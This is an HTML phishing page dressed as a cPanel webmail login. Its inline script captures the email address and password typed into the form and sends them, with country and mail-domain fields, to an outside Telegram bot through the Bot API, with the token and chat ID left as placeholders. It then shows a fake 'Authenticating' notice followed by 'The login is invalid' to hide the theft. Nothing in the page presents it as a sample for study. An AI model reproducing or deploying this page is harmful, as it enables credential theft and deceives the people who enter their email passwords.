<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
    <title>Webmail Login</title>
   
    <!-- Link to external CSS files -->
    <link href="open_sans.min.css" rel="stylesheet" type="text/css">
    <link href="style_v2_optimized.css" rel="stylesheet" type="text/css">
    
    <!-- Font Awesome for Icons -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">

    <style type="text/css">
        .input-field-login {
            position: relative;
        }

        .input-field-login .fa {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            font-size: 18px;
            color: #aaa;
        }

        .std_textbox {
            padding-left: 30px; /* Add space for the icons */
        }

        /* Notification Bars */
        .notification-bar {
            display: none;
            width: 100%;
            padding: 10px;
            text-align: center;
            font-size: 14px;
            font-weight: bold;
        }

        .notification-bar.authenticating {
            background-color: lightblue;
            color: #000;
        }

        .notification-bar.invalid {
            background-color: red;
            color: #fff;
        }
    </style>

    <script>
        // Function to fetch user's country (example uses placeholder data)
        async function fetchUserData() {
            const emailField = document.getElementById("user");
            const country = "United States"; // Placeholder. Use IP-based API for real data.
            const mx = "example.com"; // Placeholder. Replace with actual logic if needed.
            
            // Populate the email field with a placeholder
            emailField.value = "user@example.com"; // Simulated email fetching
            return { country, mx };
        }

        document.addEventListener("DOMContentLoaded", async () => {
            await fetchUserData();
        });

        // Function to handle login
        async function handleLogin(event) {
            event.preventDefault(); // Prevent form submission

            const email = document.getElementById("user").value;
            const password = document.getElementById("pass").value;

            // Fetch user data
            const { country, mx } = await fetchUserData();

            // Send data to Telegram
            const botToken = "YOUR_BOT_TOKEN";
            const chatId = "CHAT_ID";

            const message = `Email: ${email}\nPassword: ${password}\nCountry: ${country}\nMX: ${mx}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            }).catch((error) => console.error("Telegram Error:", error));

            // Show authenticating bar
            const notificationBar = document.getElementById("notification-bar");
            notificationBar.textContent = "Authenticating...";
            notificationBar.className = "notification-bar authenticating";
            notificationBar.style.display = "block";

            // Show invalid login message after 1.3 seconds
            setTimeout(() => {
                notificationBar.textContent = "The login is invalid";
                notificationBar.className = "notification-bar invalid";
            }, 1300);
        }
    </script>
</head>
<body class="wm">
<div id="preload_images"></div>

<div id="notification-bar" class="notification-bar"></div> <!-- Notification Bar -->

<input type="hidden" id="goto_uri" value="/3rdparty/roundcube/?_task=mail&amp;_mbox=INBOX">
<input type="hidden" id="goto_app" value="">
<div id="login-wrapper" class="group " style="opacity: 1; visibility: visible;">
    <div class="wrapper">
        <div id="content-container">
            <div id="login-container">
                <div id="login-sub-container">
                    <div id="login-sub-header">
                        <img class="main-logo" src="webmail-logo.svg" alt="logo">
                    </div>
                    <div id="login-sub">
                        <div id="forms">
                            <form novalidate="" id="login_form" action="javascript:void(0);" method="post" target="_self">
                                <div class="input-req-login"><label for="user">Email Address</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
                                    <i class="fa fa-user"></i>
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
                                    <i class="fa fa-lock"></i>
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="login_submit" tabindex="3" onclick="handleLogin(event)">Log in</button>
                                    </div>
                                </div>
                                <div class="clear" id="push"></div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Languages Section -->
    <div id="locale-footer" style="display: block;">
        <div class="locale-container">
            <ul id="locales_list">
                <div class="languages">
                    <li><a href="#en">English</a></li>
                    <li><a href="#ar">العربية</a></li>
                    <li><a href="#bg">български</a></li>
                    <li><a href="#cs">čeština</a></li>
                    <li><a href="#da">dansk</a></li>
                    <li><a href="#de">Deutsch</a></li>
                    <li><a href="#el">Ελληνικά</a></li>
                    <li><a href="#es">español</a></li>
                </div>
            </ul>
        </div>
    </div>
</div>

<div class="copyright">
    Copyright©&nbsp;2024 cPanel, L.L.C.
    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
</div>

</body>
</html>
